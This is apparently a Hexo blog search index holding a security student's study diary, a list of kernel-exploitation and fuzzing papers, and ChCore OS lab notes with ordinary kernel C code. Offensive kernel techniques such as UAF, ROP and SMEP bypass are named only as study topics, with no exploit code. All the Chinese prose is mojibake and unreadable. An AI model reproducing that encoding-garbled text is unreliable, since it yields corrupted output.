<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Emiyaã®diary</title>
    <url>/2099/06/16/Emiya%E3%81%AEdiary/</url>
    <content><![CDATA[<span id="more"></span>

<h3 id="20220502-20220508"><a href="#20220502-20220508" class="headerlink" title="20220502 - 20220508"></a>20220502 - 20220508</h3><ol>
<li><p>å­¦ä¹ åˆ©ç”¨Hexoå’Œgithubæ­å»ºåšå®¢ï¼Œç›®å‰åšå®¢åŸºæœ¬æ­å»ºå®Œæˆ</p>
</li>
<li><p>æ­å»ºåµŒå…¥å¼ç¯å¢ƒï¼ŒåŸºæœ¬å®Œæˆ</p>
</li>
<li><p>å­¦ä¹ ä¿®å¤è·¯ç”±å™¨è¿è¡Œç¯å¢ƒ</p>
</li>
<li><p>å­¦ä¹  kernel pwn åŸºç¡€ç¯å¢ƒæ­å»ºçŸ¥è¯†</p>
</li>
</ol>
<h3 id="20220509-20220515"><a href="#20220509-20220515" class="headerlink" title="20220509 - 20220515"></a>20220509 - 20220515</h3><ol>
<li><p>å­¦ä¹  0CTF-2021-kernoteï¼Œ ä¸»è¦æ€æƒ³æ˜¯åˆ©ç”¨ ldt_struct ç»“æ„</p>
</li>
<li><p>å­¦ä¹  Linux Kernel Pwn UAF ROP ret2usr Bypass-smep</p>
</li>
<li><p>å­¦ä¹  Linux kernel çš„å¯åŠ¨ä¸åˆå§‹åŒ–æµç¨‹</p>
</li>
</ol>
<h3 id="20220516-20220522"><a href="#20220516-20220522" class="headerlink" title="20220516 - 20220522"></a>20220516 - 20220522</h3>]]></content>
      <categories>
        <category>å­¦ä¹ æ—¥è®°</category>
      </categories>
  </entry>
  <entry>
    <title>æœ‰è¶£çš„è®ºæ–‡åˆ—è¡¨</title>
    <url>/2022/05/28/%E6%9C%89%E8%B6%A3%E7%9A%84%E8%AE%BA%E6%96%87%E5%88%97%E8%A1%A8/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h2><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><ol>
<li>2022-S&amp;P: <a href="https://www.computer.org/csdl/pds/api/csdl/proceedings/download-article/1A4Q45SVJm0/pdf">GREBE: Unveiling Exploitation Potential for Linux Kernel Bugs</a> â€”â€” ã€<a href="https://github.com/Markakd/GREBE">tool-GREBE</a>ã€‘<h3 id="Vulnerability-Detection"><a href="#Vulnerability-Detection" class="headerlink" title="Vulnerability Detection"></a>Vulnerability Detection</h3></li>
</ol>
<hr>
<h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h2 id="System"><a href="#System" class="headerlink" title="System"></a>System</h2><h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><ol>
<li>2022-S&amp;Pï¼š<a href="https://csdl-downloads.ieeecomputer.org/proceedings/sp/2022/1316/00/131600a542.pdf?Expires=1653707881&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9jc2RsLWRvd25sb2Fkcy5pZWVlY29tcHV0ZXIub3JnL3Byb2NlZWRpbmdzL3NwLzIwMjIvMTMxNi8wMC8xMzE2MDBhNTQyLnBkZiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY1MzcwNzg4MX19fV19&Signature=lMSIxAil3V7cRx-OpUESpb4K4Mr12Oy1xGsiIbLCmpt1srOtvaXuS5n3yjQil9iQHxK-9aOYT0iWz0j8upSJDpVD51oJX6TGghI08NIEN8wbEht1dMw6ZrKnRJbp8K4FmZuMzn12nAhq3mROXf-KQMDiCK7JXDB5YLWwomHotUlXotdveYCzSu9jwYoHHDPElCkXuFS4fZpScA43PKzHFhz8nnFFznFE4qcIE3I0zd82WfcwgYHTQQ6DzJVbJXEALEKASKCvHU0y0ARckV9ZQBZWaz3FRCRkLu6QQ~GzPIaiUo4S6ONuj5lvWDRUy5M1folnT4WeFdLwoMzHRkCyBg__&Key-Pair-Id=K12PMWTCQBDMDT">Exploit the Last Straw That Breaks Android Systems</a> â€”â€” ã€<a href="https://github.com/likakn/StrawFuzzer">tool-StrawFuzzer</a>ã€‘</li>
</ol>
<hr>
<h1 id="Embeded"><a href="#Embeded" class="headerlink" title="Embeded"></a>Embeded</h1><h2 id="Hardware"><a href="#Hardware" class="headerlink" title="Hardware"></a>Hardware</h2><h3 id="Fuzzing-1"><a href="#Fuzzing-1" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><ol>
<li>2022-S&amp;Pï¼š<a href="https://csdl-downloads.ieeecomputer.org/proceedings/sp/2022/1316/00/131600a632.pdf?Expires=1653708149&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9jc2RsLWRvd25sb2Fkcy5pZWVlY29tcHV0ZXIub3JnL3Byb2NlZWRpbmdzL3NwLzIwMjIvMTMxNi8wMC8xMzE2MDBhNjMyLnBkZiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY1MzcwODE0OX19fV19&Signature=emhbfq0dNAfDftpnmFsjlx03Q~Ps6TKSEXkYuB5nsJnvb0iDcZaxZBRj9uxFUX~n0oLghmMCno6HEGf9C6k7LT-u5yWQmuPbbdprRRYN0d4MizyRqOt7LR5SeTWjqp3fBQ3FPtovEsNj-EPwFFrHqQcwOkMfksRl4hwJN135iBCI~Eu7W-y3JQslk4FoDQwHLxSnwo90yWkQPBrOX-jfHSXYeG4uxxe1JJjJG5u9yBP-B7UBW7eieQe27-vgpiZKtQmAJsyGwjTygdvRBH1YZ3K05V3ale~qujnrCj4a~0H9l5YQAHi6AxtKa7vRM3sppFrFAYV~A24LnKxJti8T~g__&Key-Pair-Id=K12PMWTCQBDMDT">FuzzUSB: Hybrid Stateful Fuzzing of USB Gadget Stacks</a> â€”â€” ã€<a href="https://github.com/purseclab/fuzzusb">tool-FuzzUSB</a>ã€‘</li>
</ol>
<h2 id="Firmware"><a href="#Firmware" class="headerlink" title="Firmware"></a>Firmware</h2><h3 id="Study"><a href="#Study" class="headerlink" title="Study"></a>Study</h3><ol>
<li>2022-S&amp;P: <a href="https://degrigis.github.io/bins/heapster.pdf">HEAPSTER: Analyzing the Security of Dynamic Allocators for Monolithic Firmware Images</a> â€”â€” ã€<a href="https://github.com/ucsb-seclab/heapster">tool-heapster</a>ã€‘</li>
</ol>
]]></content>
      <categories>
        <category>é˜…è¯»ç¬”è®°</category>
      </categories>
      <tags>
        <tag>æ¨è</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Kernel æŒ–çŸ¿ä¹‹æ—…</title>
    <url>/2022/05/13/Linux-Kernel-%E6%8C%96%E7%9F%BF%E4%B9%8B%E6%97%85/</url>
    <content><![CDATA[<blockquote>
<p>æœ¬æ–‡å­¦ä¹ çš„å†…æ ¸ç‰ˆæœ¬ä¸º 5.17.7 x86</p>
</blockquote>
<h1 id="ä¸ºä»€ä¹ˆè¦å­¦ä¹ -Linux-Kernel"><a href="#ä¸ºä»€ä¹ˆè¦å­¦ä¹ -Linux-Kernel" class="headerlink" title="ä¸ºä»€ä¹ˆè¦å­¦ä¹  Linux Kernel"></a>ä¸ºä»€ä¹ˆè¦å­¦ä¹  Linux Kernel</h1><p>å¹¿ä¹‰è€Œè¨€ï¼Œæ“ä½œç³»ç»Ÿå°±æ˜¯ä¸€ä¸ªè½¯ä»¶ï¼Œèƒ½å¤Ÿç®¡ç†ç¡¬ä»¶å’Œè½¯ä»¶èµ„æºï¼Œä¸ºè½¯ä»¶æä¾›æ›´å¥½çš„è¿è¡Œç¯å¢ƒï¼Œä¸ºç¡¬ä»¶æä¾›æ›´å¥½çš„è®¿é—®æ”¯æŒ</p>
<p>å¦‚æœæ“ä½œç³»ç»Ÿæ˜¯ä¸€ä¸ªè½¯ä»¶ï¼Œé‚£ä¹ˆå†…æ ¸å…¶å®ç›¸å¯¹äºæ“ä½œç³»ç»Ÿè€Œè¨€ä¹Ÿæ˜¯æ“ä½œç³»ç»Ÿï¼Œæ„Ÿè§‰æœ‰ç§æ— é™å¥—å¨ƒçš„æ„Ÿè§‰ï¼Œä½†æ˜¯æ˜¯å¯ä»¥è¿™ä¹ˆè¯´çš„ï¼Œæ“ä½œç³»ç»Ÿä¸ºè½¯ä»¶è®¿é—®ç¡¬ä»¶æä¾›æœåŠ¡ï¼Œå†…æ ¸ä¸ºæ“ä½œç³»ç»Ÿè®¿é—®ç¡¬ä»¶æä¾›æœåŠ¡ï¼Œæ‰€ä»¥å†…æ ¸æ˜¯æ“ä½œç³»ç»Ÿçš„ç²¾åæ‰€åœ¨ï¼Œé€šè¿‡å­¦ä¹ å†…æ ¸èƒ½å¤Ÿå¯¹æ“ä½œç³»ç»Ÿæ‹¥æœ‰æ›´æ·±çš„è®¤è¯†</p>
<p>ä¸¾ä¸ªå¯èƒ½ä¸æ˜¯å¾ˆæ°å½“çš„ä¾‹å­ï¼Œåœ¨ç”¨æˆ·å±‚é¢å¯ä»¥é€šè¿‡ malloc å‡½æ•°åˆ†é…å†…å­˜ï¼Œä½†æ˜¯å†…æ ¸åˆ†é…çš„å†…å­˜ä¸ç”¨æˆ·è¦æ±‚çš„å†…å­˜æ˜¯å¦å®Œå…¨ä¸€è‡´ï¼Œè¿™ä¸ªå°±éœ€è¦è€ƒè™‘å†…æ ¸çš„å†…å­˜ç®¡ç†å’Œåˆ†é…ç­–ç•¥</p>
<p>è€Œä¸”å†…æ ¸æ˜¯ä¸€ç¾¤æå®¢ç”¨æç«¯çš„æ–¹å¼å‹æ¦¨èµ„æºæå‡ºæ¥çš„ï¼Œå®ƒåŒ…å«äº†å‡ ä¹æ‰€æœ‰èƒ½æƒ³åˆ°çš„æ–¹å¼å»è¿›è¡Œæ„é€ ï¼Œä»¥ä½¿å¾—è¾¾åˆ°è¶³å¤Ÿçš„æ€§èƒ½</p>
<p>æ€»çš„æ¥è¯´ï¼Œç†Ÿæ‚‰æ“ä½œç³»ç»Ÿå†…æ ¸èƒ½å¤Ÿä½¿å¾—åœ¨ OS-S è·¯ä¸Šèµ°çš„æ›´è¿œ</p>
<h1 id="Linux-Kernel-å¯åŠ¨æµç¨‹"><a href="#Linux-Kernel-å¯åŠ¨æµç¨‹" class="headerlink" title="Linux Kernel å¯åŠ¨æµç¨‹"></a>Linux Kernel å¯åŠ¨æµç¨‹</h1><ul>
<li><a href="Linux-Kernel-%E4%B9%8B-%E5%BC%80%E5%A4%A9%E8%BE%9F%E5%9C%B0.md">Kernel è£…è½½åˆ°å†…å­˜</a></li>
<li><a href="Linux-Kernel-%E4%B9%8B-%E9%82%A3%E4%B8%80%E6%9D%9F%E5%85%89.md">Kernel åˆå§‹åŒ–åˆ°å¯åŠ¨</a></li>
</ul>
<hr>
<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul>
<li>Linux å†…æ ¸æ­ç§˜</li>
</ul>
]]></content>
      <categories>
        <category>Kernel</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ChCore Lab3 ç”¨æˆ·è¿›ç¨‹ä¸å¼‚å¸¸å¤„ç†</title>
    <url>/2022/05/31/ChCore-Lab3-%E7%94%A8%E6%88%B7%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="å®ç°ç”¨æˆ·è¿›ç¨‹"><a href="#å®ç°ç”¨æˆ·è¿›ç¨‹" class="headerlink" title="å®ç°ç”¨æˆ·è¿›ç¨‹"></a>å®ç°ç”¨æˆ·è¿›ç¨‹</h1><h2 id="åŸºäº-Capability-çš„èµ„æºè®¿é—®æ§åˆ¶"><a href="#åŸºäº-Capability-çš„èµ„æºè®¿é—®æ§åˆ¶" class="headerlink" title="åŸºäº Capability çš„èµ„æºè®¿é—®æ§åˆ¶"></a>åŸºäº Capability çš„èµ„æºè®¿é—®æ§åˆ¶</h2><p><code>ChCore</code> ä¸­å¯¹å†…æ ¸èµ„æºä½¿ç”¨èƒ½åŠ›ï¼ˆ<code>Capability</code>ï¼‰æœºåˆ¶è¿›è¡Œç®¡ç†ï¼Œå†…æ ¸èµ„æºè¢«æŠ½è±¡æˆäº†å†…æ ¸å¯¹è±¡ï¼ˆkernel objectï¼‰ï¼Œé€šè¿‡ <code>æ•´å‹æ ‡è¯†ç¬¦</code> å¯¹å†…æ ¸å¯¹è±¡è¿›è¡Œè®¿é—®ï¼Œçœ‹èµ·æ¥ä¹Ÿç¡®å®å¯ä»¥ç†è§£ä¸º <code>Linuxæ–‡ä»¶æè¿°ç¬¦</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ç³»ç»Ÿè°ƒç”¨åˆ›å»ºå†…æ ¸å¯¹è±¡</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys_create_pmo</span><span class="params">(u64 size, u64 type)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> cap, r;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pmobject</span> *<span class="title">pmo</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    pmo = obj_alloc(TYPE_PMO, <span class="keyword">sizeof</span>(*pmo));    <span class="comment">// æ„å»ºå†…æ ¸å¯¹è±¡</span></span><br><span class="line">    ...</span><br><span class="line">    pmo_init(pmo, type, size, <span class="number">0</span>);               <span class="comment">// åˆå§‹åŒ–å†…æ ¸å¯¹è±¡</span></span><br><span class="line">    cap = cap_alloc(current_process, pmo, <span class="number">0</span>);   <span class="comment">// ä¸ºå†…æ ¸å¯¹è±¡åˆ›å»º cap æè¿°ç¬¦</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> cap;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨å†…æ ¸å¯¹è±¡</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys_map_pmo</span><span class="params">(u64 target_process_cap, u64 pmo_cap, u64 addr, u64 perm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vmspace</span> *<span class="title">vmspace</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pmobject</span> *<span class="title">pmo</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">process</span> *<span class="title">target_process</span>;</span></span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    ...</span><br><span class="line">    pmo = obj_get(current_process, pmo_cap, TYPE_PMO); <span class="comment">// æ ¹æ® cap è·å–å½“å‰è¿›ç¨‹çš„å†…æ ¸å¯¹è±¡</span></span><br><span class="line">    <span class="comment">// å°†å†…æ ¸å¯¹è±¡æ˜ å°„åˆ°å…¶ä»–è¿›ç¨‹</span></span><br><span class="line">    target_process = obj_get(current_process, target_process_cap,</span><br><span class="line">                    TYPE_PROCESS);</span><br><span class="line"></span><br><span class="line">    vmspace = obj_get(target_process, VMSPACE_OBJ_ID, TYPE_VMSPACE);</span><br><span class="line"></span><br><span class="line">    r = vmspace_map_range(vmspace, addr, pmo-&gt;size, perm, pmo);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (target_process != current_process)</span><br><span class="line">        r = cap_copy(current_process, target_process, pmo_cap, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        r = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    out_obj_put_vmspace:</span><br><span class="line">        obj_put(vmspace);</span><br><span class="line">        obj_put(target_process);</span><br><span class="line">    out_obj_put_pmo:</span><br><span class="line">        obj_put(pmo);</span><br><span class="line">    out_fail:</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="è¿›ç¨‹ä¸çº¿ç¨‹"><a href="#è¿›ç¨‹ä¸çº¿ç¨‹" class="headerlink" title="è¿›ç¨‹ä¸çº¿ç¨‹"></a>è¿›ç¨‹ä¸çº¿ç¨‹</h2><p>ChCore å†…æ ¸ä½¿ç”¨ process ç»“æ„ä½“è¡¨ç¤ºè¿›ç¨‹ä¿¡æ¯ï¼Œä½¿ç”¨ thread è¡¨ç¤ºçº¿ç¨‹ä¿¡æ¯ï¼Œä¸€ä¸ªè¿›ç¨‹æ˜¯çº¿ç¨‹çš„é›†åˆï¼Œè¿™äº›çº¿ç¨‹å¯¹ç‰¹å®šå†…æ ¸å¯¹è±¡äº«æœ‰ç›¸åŒçš„ Capability</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">process</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">slot_table</span> <span class="title">slot_table</span>;</span> <span class="comment">// æœ‰æƒè®¿é—®çš„å†…æ ¸å¯¹è±¡æ•°ç»„</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">thread_list</span>;</span> <span class="comment">// æ‰€æœ‰çº¿ç¨‹åˆ—è¡¨</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slot_table</span> &#123;</span></span><br><span class="line">    <span class="comment">// å†…æ ¸å¯¹è±¡æ•°ç›®</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> slots_size;</span><br><span class="line">    <span class="comment">// å†…æ ¸å¯¹è±¡æŒ‡é’ˆ</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">object_slot</span> **<span class="title">slots</span>;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * if a bit in full_slots_bmp is 1, corresponding</span></span><br><span class="line"><span class="comment">	 * sizeof(unsigned long) bits in slots_bmp are all set</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *full_slots_bmp;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *slots_bmp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">node</span>;</span>	<span class="comment">// ä»å±åŒä¸€è¿›ç¨‹çš„çº¿ç¨‹é“¾è¡¨</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">thread_ctx</span> *<span class="title">thread_ctx</span>;</span>	<span class="comment">// çº¿ç¨‹ä¸Šä¸‹æ–‡ ï¼Ÿ çº¿ç¨‹æ§åˆ¶å—</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vmspace</span> *<span class="title">vmspace</span>;</span>	<span class="comment">//è™šæ‹Ÿåœ°å€æ˜ å°„ç©ºé—´</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">process</span> *<span class="title">process</span>;</span> <span class="comment">// æ‰€å±è¿›ç¨‹</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_ctx</span> &#123;</span></span><br><span class="line">	<span class="comment">/* Executing Context */</span></span><br><span class="line">	<span class="type">arch_exec_cont_t</span> ec;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Thread Type */</span></span><br><span class="line">	u32 type;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// æ‰§è¡Œå¯„å­˜å™¨çŠ¶æ€</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">arch_exec_cont</span> &#123;</span></span><br><span class="line">	u64 reg[REG_NUM];</span><br><span class="line">&#125; <span class="type">arch_exec_cont_t</span>;</span><br><span class="line"><span class="comment">// è¿›ç¨‹ç±»å‹</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">thread_type</span> &#123;</span></span><br><span class="line">	TYPE_IDLE = <span class="number">0</span>,</span><br><span class="line">	<span class="comment">/* ROOT thread has all cap, it is also a user thread */</span></span><br><span class="line">	TYPE_ROOT,</span><br><span class="line">	TYPE_USER,</span><br><span class="line">	TYPE_SHADOW,</span><br><span class="line">	TYPE_KERNEL,</span><br><span class="line">	TYPE_TESTS</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// å¯„å­˜å™¨ç±»å‹</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">reg_type</span> &#123;</span></span><br><span class="line">	X0 = <span class="number">0</span>,			<span class="comment">/* 0x00 */</span></span><br><span class="line">	X1 = <span class="number">1</span>,			<span class="comment">/* 0x08 */</span></span><br><span class="line">	X2 = <span class="number">2</span>,			<span class="comment">/* 0x10 */</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">	X29 = <span class="number">29</span>,		<span class="comment">/* 0xe8 */</span></span><br><span class="line">	X30 = <span class="number">30</span>,		<span class="comment">/* 0xf0 */</span></span><br><span class="line">	SP_EL0 = <span class="number">31</span>,		<span class="comment">/* 0xf8 */</span></span><br><span class="line">	ELR_EL1 = <span class="number">32</span>,		<span class="comment">/* 0x100 NEXT PC */</span></span><br><span class="line">	SPSR_EL1 = <span class="number">33</span>,		<span class="comment">/* 0x108 */</span></span><br><span class="line">	TPIDR_EL0 = <span class="number">34</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="åˆ›å»ºå¹¶æ‰§è¡Œä¸»çº¿ç¨‹"><a href="#åˆ›å»ºå¹¶æ‰§è¡Œä¸»çº¿ç¨‹" class="headerlink" title="åˆ›å»ºå¹¶æ‰§è¡Œä¸»çº¿ç¨‹"></a>åˆ›å»ºå¹¶æ‰§è¡Œä¸»çº¿ç¨‹</h2><p>ChCore ä¸­æ— </p>
]]></content>
      <categories>
        <category>Kernel</category>
        <category>ARM</category>
      </categories>
      <tags>
        <tag>AArch64</tag>
      </tags>
  </entry>
  <entry>
    <title>ChCore Lab2 å†…å­˜ç®¡ç†</title>
    <url>/2022/05/30/ChCore-Lab2-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="ç‰©ç†å†…å­˜ç®¡ç†"><a href="#ç‰©ç†å†…å­˜ç®¡ç†" class="headerlink" title="ç‰©ç†å†…å­˜ç®¡ç†"></a>ç‰©ç†å†…å­˜ç®¡ç†</h1><h2 id="ç‰©ç†å†…å­˜å¸ƒå±€"><a href="#ç‰©ç†å†…å­˜å¸ƒå±€" class="headerlink" title="ç‰©ç†å†…å­˜å¸ƒå±€"></a>ç‰©ç†å†…å­˜å¸ƒå±€</h2><h3 id="é—®é¢˜-1"><a href="#é—®é¢˜-1" class="headerlink" title="é—®é¢˜ 1"></a>é—®é¢˜ 1</h3><p><strong>è¯·ç®€å•è§£é‡Šï¼Œåœ¨å“ªä¸ªæ–‡ä»¶æˆ–ä»£ç æ®µä¸­æŒ‡å®šäº† ChCore ç‰©ç†å†…å­˜å¸ƒå±€ã€‚ä½ å¯ä»¥ä»ä¸¤ä¸ªæ–¹é¢å›ç­”è¿™ä¸ªé—®é¢˜: ç¼–è¯‘é˜¶æ®µå’Œè¿è¡Œæ—¶é˜¶æ®µã€‚</strong></p>
<p>åœ¨ç¼–è¯‘é˜¶æ®µï¼Œä¸»è¦ä½¿ç”¨çš„æ˜¯è¿æ¥å™¨è„šæœ¬è¿›è¡Œç¡®è®¤ï¼š</p>
<ul>
<li><code>bootloader</code> å¯¹åº” <code>kernel.img</code> çš„ <code>init</code> æ®µï¼Œ<code>img_start</code> å³ <code>init</code> è¢«ç¡¬ç¼–ç ä¸º <code>0x80000</code>ï¼Œå…¶èŒƒå›´å³ä¸ºæ•´ä¸ª <code>init</code> æ®µçš„èŒƒå›´</li>
<li>å†…æ ¸ å¯¹åº” <code>kernel.img</code> çš„ <code>.text</code> <code>.rodata</code> ç­‰ç¨‹åºæ®µï¼Œæœ«å°¾å³ <code>img_end</code></li>
<li><code>Reserved</code> å±äºæ˜¯ä¸ä½¿ç”¨åŒºåŸŸï¼Œè®¿é—®å¼•å‘å¼‚å¸¸</li>
</ul>
<p>åœ¨è¿è¡Œæ—¶é˜¶æ®µï¼Œåˆ†é…è¿‡ç¨‹å³ <code>Memory Layout</code> ç”± <code>mm.c</code> å†³å®š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PHYSICAL_MEM_START (24*1024*1024)	<span class="comment">//24M</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> START_VADDR phys_to_virt(PHYSICAL_MEM_START)	<span class="comment">//24M</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NPAGES (128*1000)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PHYSICAL_MEM_END (PHYSICAL_MEM_START+NPAGES*BUDDY_PAGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="type">vaddr_t</span> free_mem_start = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_meta_start</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">u64 npages = <span class="number">0</span>;</span><br><span class="line">u64 start_vaddr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å†…å­˜å¯¹å…¶</span></span><br><span class="line">free_mem_start =</span><br><span class="line">    phys_to_virt(ROUND_UP((<span class="type">vaddr_t</span>) (&amp;img_end), PAGE_SIZE));</span><br><span class="line">npages = NPAGES;</span><br><span class="line">start_vaddr = START_VADDR;</span><br><span class="line">kdebug(<span class="string">&quot;[CHCORE] mm: free_mem_start is 0x%lx, free_mem_end is 0x%lx\n&quot;</span>,</span><br><span class="line">        free_mem_start, phys_to_virt(PHYSICAL_MEM_END));</span><br><span class="line"></span><br><span class="line"><span class="comment">// é¢„ç•™ npages é¡µå†…å­˜ä½œä¸º page metadata çš„ç©ºé—´</span></span><br><span class="line"><span class="keyword">if</span> ((free_mem_start + npages * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> page)) &gt; start_vaddr) &#123;</span><br><span class="line">    BUG(<span class="string">&quot;kernel panic: init_mm metadata is too large!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">page_meta_start = (<span class="keyword">struct</span> page *)free_mem_start;</span><br><span class="line">kdebug(<span class="string">&quot;page_meta_start: 0x%lx, real_start_vadd: 0x%lx,&quot;</span></span><br><span class="line">        <span class="string">&quot;npages: 0x%lx, meta_page_size: 0x%lx\n&quot;</span>,</span><br><span class="line">        page_meta_start, start_vaddr, npages, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> page));</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆå§‹åŒ–ç‰©ç†å†…å­˜çš„ä¼™ä¼´åˆ†é…å™¨</span></span><br><span class="line"><span class="comment">/* buddy alloctor for managing physical memory */</span></span><br><span class="line">init_buddy(&amp;global_mem, page_meta_start, start_vaddr, npages);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆå§‹åŒ–åˆ†é…å°å†…å­˜åŒºåŸŸçš„ slabåˆ†é…å™¨</span></span><br><span class="line"><span class="comment">/* slab alloctor for allocating small memory regions */</span></span><br><span class="line">init_slab();</span><br><span class="line"></span><br><span class="line">map_kernel_space(KBASE + (<span class="number">128UL</span> &lt;&lt; <span class="number">21</span>), <span class="number">128UL</span> &lt;&lt; <span class="number">21</span>, <span class="number">128UL</span> &lt;&lt; <span class="number">21</span>);</span><br><span class="line"><span class="comment">//check whether kernel space [KABSE + 256 : KBASE + 512] is mapped </span></span><br><span class="line">kernel_space_check();</span><br></pre></td></tr></table></figure>
<ul>
<li><code>page metadata</code> æ˜¯ç‰©ç†é¡µçš„å…ƒæ•°æ®ï¼Œå³ <code>struct page</code>ï¼Œç”¨æ¥è®°å½•é¡µé¢çš„å±æ€§ï¼Œå¦‚æ˜¯å¦è¢«åˆ†é…ã€å†…å­˜å—é˜¶æ•°æ˜¯å¦è¢« <code>slab</code> åˆ†é…å™¨ä½¿ç”¨</li>
<li><code>page</code> å³å®é™…å­˜åœ¨çš„ç‰©ç†é¡µé¢</li>
</ul>
<h2 id="ä¼™ä¼´ç³»ç»Ÿ"><a href="#ä¼™ä¼´ç³»ç»Ÿ" class="headerlink" title="ä¼™ä¼´ç³»ç»Ÿ"></a>ä¼™ä¼´ç³»ç»Ÿ</h2><h3 id="æ–¹æ¡ˆæ€æƒ³"><a href="#æ–¹æ¡ˆæ€æƒ³" class="headerlink" title="æ–¹æ¡ˆæ€æƒ³"></a>æ–¹æ¡ˆæ€æƒ³</h3><p>ä¼™ä¼´ç³»ç»Ÿçš„æ€æƒ³æ˜¯å°†å†…å­˜è¿›è¡Œåˆ†å—ï¼Œå»ºç«‹ç©ºé—²å—çš„é“¾è¡¨ <code>free_lists</code>ï¼Œæ¯ç»„é“¾è¡¨ä¸­ä½¿ç”¨ <code>list_head</code> é“¾æ¥åŒé˜¶å†…å­˜å¿«</p>
